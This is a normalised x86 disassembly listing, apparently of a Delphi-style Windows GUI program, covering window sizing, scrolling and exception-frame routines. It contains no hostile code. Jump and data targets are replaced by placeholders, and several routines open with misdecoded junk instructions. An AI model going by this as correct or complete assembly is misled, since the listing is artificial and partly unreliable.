mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_44cba4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44cba4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_44d210
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_44d210
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_44d210
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_44d210
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_44d210
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_44d210
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_44d714
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_4346cc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4346f8
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_4346cc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4346f8
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_4345b8
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_44cf8c
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_4345b8
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_4345fc
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_44cf8c
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_4345b8
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_44cf8c
mov eax ebx
call sub_4345b8
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_4345fc
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_4345fc
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_44cf8c
mov eax ebx
call sub_4345fc
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_44d868
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_44cf8c
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_44cf8c
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call sub_405fa4
mov edx eax
mov eax ebp
call sub_44d0dc
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call sub_405fa4
mov edx eax
mov eax ebp
call sub_44d0dc
sub_44d90c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44d868
mov ecx edi
mov edx esi
mov eax ebx
call sub_43ae9c
pop edi
pop esi
pop ebx
retn
sub_44d934
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_44d99e
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43997c
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d9a5
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_44d9a5
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_44d9dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44d584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d9e4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_44d9e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d604
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_44da58
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4345fc
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_4233b8
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_4345b8
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_4233b8
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_4124ac
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_4373fc
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44dac8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44db29
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43a70c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44db30
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_44db58
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44d328
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_434370
mov edx 0x29
mov eax esi
call sub_434394
mov [ esi + 0x220 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_44dbb8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44d3dc
xor eax eax
mov al [ ebx + 0x220 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_44dc24
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43a9a8
pop esi
pop ebx
retn
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
mov eax ebx
call sub_438930
sub_44dc50
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44ddb4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_44dd94
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_403070
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_40344c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dd9b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_44dd5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_413678
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403078
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4038b4
sub_44dddc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403324
and [ ebx + 0x2f4 ] 0xdf
sub_44de14
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44d328
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_434324
xor edx edx
mov eax ebx
call sub_434348
mov edx 0x140
mov eax ebx
call sub_434370
mov edx 0xf0
mov eax ebx
call sub_434394
mov dl 0x1
mov eax [ r-xdata ]
call sub_42294c
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_44e730
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ce98
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_433790
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_403070
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_44ea94
xor edx edx
mov eax ebx
call sub_434d78
xor edx edx
mov eax ebx
call sub_434ce0
mov dl 0x1
mov eax ebx
call sub_43b4d0
mov edx ebx
mov eax [ rw-data ]
call sub_4530f8
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_44df8d
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_419510
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_4139fc
xor edx edx
mov eax ebx
call sub_416494
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_451fa0
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_44dff8
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4034b4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_44e0c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45091c
mov eax [ ebp - 0x4 ]
call sub_43b694
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_453130
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403128
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403128
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40cc70
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44d3a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e0c9
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_44e0dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_44e11d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44ea94
sub_44e122
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403324
test al al
jne r-xdata
call sub_403930
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_4038dc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44ea94
sub_44e158
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push j_sub_4035c8#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_44e1b8
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_436c64
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403324
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_450460
sub_44e1f4
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_434084
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_41375c
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_44f858
mov edx esi
mov eax ebp
call sub_4139fc
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_44f830
mov edx esi
mov eax edi
call sub_44f858
jmp r-xdata
xor edx edx
mov eax edi
call sub_44f80c
sub_44e300
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_437c28
xor edx edx
push ebp
push sub_44e556
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_437384
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4345d0
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_434614
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_44e688
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_435d5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e55d
mov eax [ ebp - 0x4 ]
call sub_437c30
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44d868
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43ae54
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44d868
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43ae54
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_41c73c
push eax
call sub_405fa4
mov edx eax
mov eax esi
call sub_41c744
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call sub_405fa4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call sub_405fa4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call sub_405fa4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call sub_405fa4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_44e565
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4386d0
push 0x0
push 0x0
push ebx
push sub_44e66c
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_44e638
push ebx
push sub_44e650
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_44e617
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_416b8c
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_434ce0
sub_44e6a3
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44d868
mov ecx edi
mov edx esi
mov eax ebx
call sub_43ae54
mov eax ebx
call sub_44e78c
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_41c7e0
push eax
call sub_405fa4
mov edx eax
mov eax ebp
call sub_41c7fc
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4345fc
mov ebp eax
push edi
push esi
mov eax ebx
call sub_4345b8
push eax
call sub_405fa4
mov edx eax
mov eax ebx
call sub_44ea34
push edi
push esi
push ebp
call sub_405fa4
mov edx eax
mov eax ebx
call sub_44ea64
sub_44e730
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_43b390
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_43b694
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_450a90
push eax
push 0x1
push 0x80
mov eax ebx
call sub_43b390
push eax
call SendMessageA
pop ebx
retn
sub_44e7c4
push ebx
mov ebx eax
mov eax ebx
call sub_44f6e0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_44e858
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b390
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_43b458
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_43b390
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_43b390
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_44e8e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_43b8f0
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_419894
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_419868
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403324
test al al
jne r-xdata
sub_44e94c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_403070
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44e978
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebp
call sub_4380c0
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_419894
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_43b938
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_419868
mov si 0xfff1
call sub_403324
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_4198a4
jmp r-xdata
sub_44ea0c
push ebx
mov ebx eax
